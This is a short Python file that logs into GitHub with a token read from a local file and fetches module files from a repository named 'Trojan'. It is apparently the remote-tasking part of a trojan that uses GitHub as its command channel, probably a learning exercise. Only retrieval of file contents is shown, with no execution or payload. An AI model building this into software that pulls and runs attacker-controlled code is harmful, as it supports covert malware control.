import os
import github3


def github_connect():
    # Get the path to the mytoken.txt file relative to the current script
    token_path = os.path.join(os.path.dirname(__file__), 'mytoken.txt')

    # Check if the file exists before proceeding
    if not os.path.exists(token_path):
        raise FileNotFoundError(f"Token file not found at {token_path}. Please make sure the file exists.")

    # Read the GitHub token
    with open(token_path, 'r') as f:
        token = f.read().strip()  # Strip whitespace or newline characters

    # Set your GitHub username
    user = 'Rskladanek'  # Replace with your actual GitHub username

    # Log in to GitHub using the token
    sess = github3.login(token=token)

    # Return the repository object
    return sess.repository(user, 'Trojan')


def get_file_contents(dirname, module_name, repo):
    # Get the content of a file in the repository
    try:
        return repo.file_contents(f'{dirname}/{module_name}').content
    except github3.exceptions.NotFoundError:
        raise FileNotFoundError(f"File {dirname}/{module_name} not found in the repository.")
